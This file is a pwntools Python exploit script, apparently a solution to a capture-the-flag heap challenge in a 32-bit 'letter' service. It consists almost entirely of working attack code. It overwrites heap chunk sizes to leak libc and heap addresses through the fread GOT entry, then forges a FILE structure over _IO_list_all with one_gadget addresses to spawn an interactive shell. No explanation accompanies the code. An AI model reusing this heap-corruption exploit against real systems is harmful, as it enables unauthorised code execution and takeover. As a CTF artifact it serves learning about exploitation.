from pwn import *
from ctypes import *
import os
import hashlib
#import roputils as rop

remote_addr = "prob.vulnerable.kr"
remote_port = 20037
local_addr = "127.0.0.1"
local_port = 1807

pc = "./chall"
pwn_elf = ELF(pc)
#pwn_rop = rop.ROP(pc)

uselibc = 1 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 0
atta = 1

def pack_file_32(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p32(_flags) + \
             p32(_IO_read_ptr) + \
             p32(_IO_read_end) + \
             p32(_IO_read_base) + \
             p32(_IO_write_base) + \
             p32(_IO_write_ptr) + \
             p32(_IO_write_end) + \
             p32(_IO_buf_base) + \
             p32(_IO_buf_end) + \
             p32(_IO_save_base) + \
             p32(_IO_backup_base) + \
             p32(_IO_save_end) + \
             p32(_IO_marker) + \
             p32(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x48, "\x00")
    struct += p32(_lock)
    struct = struct.ljust(0x68,"\x00")
    struct += p32(_mode)
    struct = struct.ljust(0x94, "\x00")
    return struct


def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)


if uselibc == 2:
    context.arch = "amd64"
else:
    context.arch = "i386"

if uselibc ==2 and haslibc == 0:
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
    if uselibc == 1 and haslibc == 0:
        libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    else:
        libc = ELF('./libc.so.6')

if local == 1:
    if haslibc:
        elf = change_ld(pc, './ld.so')
        p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
        #p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
    else:
        p = process(pc)
elif local == 0:
    p = remote(remote_addr,remote_port)
    if haslibc:
        libc = ELF('./libc.so.6')
else:
    p = remote(local_addr,local_port)
    if haslibc:
        libc = ELF('./libc.so.6')

context.log_level = True

if local:
    if atta:
        #gdb.attach(p,'b *0x08048f7f\n b*0x08048FB6\n b*0x08048CDF')
        #gdb.attach(p,'b*0x08048CDF')
        gdb.attach(p,'b*0x08048922')
        #gdb.attach(p,'b*0x000000000000139c +0x555555554000\n')


def sla(a,b):
    global p
    p.sendlineafter(a,b)

def sa(a,b):
    global p
    p.sendafter(a,b)

def ru(a):
    global p
    p.recvuntil(a)

def rv(a):
    global p
    return p.recv(a)

def rl():
    global p
    return p.recvline()

def sn(a):
    global p
    p.send(a)

def sl(a):
    global p
    p.sendline(a)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def add_letter(size,content,to):
    sla('Select:\n','1')
    sla('Size:\n',str(size))
    sa('Content:\n',content)
    sa('To:\n',to)

def check_letter():
    sla('Select:\n','2')

def delete_letter(idx):
    sla('Select:\n','3')
    sla('Index:\n',str(idx))

def hack():
    raw_input()
    fread_got = pwn_elf.got['fread']
    add_letter(0x48,'a'+'\n','b'+'\n')  #0
    delete_letter(0)
    add_letter(8,'a'+'\n','b'+'\n') #1
    payload = '\x00'*0x20 + '\x41'
    add_letter(8,'a'+'\n',payload) #2
    delete_letter(1)
    payload = '\x00'*0x2c + p32(0x41) + p32(fread_got-0xc)
    add_letter(0x38,payload+'\n','b'+'\n')  #3
    check_letter()
    ru('[1] To: ')
    libc.address = u32(rv(4)) - libc.symbols['fread']
    lg('libc',libc.address)
    top_chunk = libc.symbols['__malloc_hook'] + 0x18 + 0x30

    add_letter(0x20,'a'+'\n','b'+'\n')  #4
    add_letter(8,'a'+'\n','b'+'\n') #5
    delete_letter(4)
    payload = '\x00'*0x20 + '\x51'
    add_letter(0x20,'a'+'\n',payload)   #6
    delete_letter(5)
    payload = '\x00'*0x2c + p32(0x21) + p32(top_chunk - 0xc)
    add_letter(0x48,payload+'\n','b'+'\n')  #7
    check_letter()
    ru('[1] To: ')
    heap_base = u32(rv(4)) - 0x198
    lg('heap',heap_base)
    
    add_letter(0x8,'a'+'\n','b'+'\n')   #8
    add_letter(0x10,'a'+'\n','b'+'\n')  #9
    delete_letter(8)
    payload = '\x00'*0x20 + '\x61'
    add_letter(0x8,'a'+'\n',payload+'\n')   #10
    delete_letter(9)
    payload = '\x00'*0x2c + p32(0x31)
    payload += p32(heap_base+0x2b0)
    add_letter(0x58,payload+'\n','b'+'\n')  #11
    payload = p32(0)*4 
    payload += p32(0) + p32(0x31)
    payload += p32(0) + p32(heap_base+0x2e0) + '\x00'*0x20
    payload += p32(0) + p32(0x51) + '\x00'*0x48
    payload += p32(0) + p32(0x11) + '\x00'*8
    payload += p32(0) + p32(0x11) + '\x00'*8
    add_letter(0x1f0,payload+'\n','b'+'\n')   #12
    add_letter(0x8,'a'+'\n','b'+'\n')   #13
    delete_letter(12)
    delete_letter(0)
    
    _IO_list_all = libc.symbols['_IO_list_all']
    gadget = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
    one_gadget = libc.address + gadget[0]
    lg('one_gadget',one_gadget)
    payload = p32(0)*4 
    payload += p32(0) + p32(0x31) 
    payload += p32(heap_base+0x1f8) + '\x00'*0x24
    payload += p32(0) + p32(0x31) + p32(0) + p32(_IO_list_all-8)
    payload += p32(0) + p32(1)
    payload += '\x00'*0x18 + p32(0x30) + p32(0x10)
    payload += '\x00'*8 + p32(0) + p32(0x11)
    payload += '\x00'*(0x94-0x48)
    payload += p32(heap_base+0x370)
    payload += p32(one_gadget)*5
    #payload = pack_file_32(_flags = )
    add_letter(0x1f0,payload+'\n','b'+'\n')   #14
    p.interactive()

hack()